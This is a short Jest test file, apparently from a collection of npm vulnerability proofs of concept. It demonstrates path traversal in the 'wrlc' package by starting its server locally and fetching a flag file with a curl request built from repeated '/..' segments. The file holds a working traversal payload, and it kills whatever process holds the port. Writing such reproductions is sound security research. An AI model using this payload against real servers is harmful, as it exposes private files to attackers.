//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/wrlc/test.js
var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8972/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in wrlc", (done) => {
  const pkg = require("wrlc");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8972/tcp", () => {});
  } catch (e) {}
  pkg.serve(
    {
      port: 8972,
      host: "localhost",
    },
    () => {}
  );
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8972${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
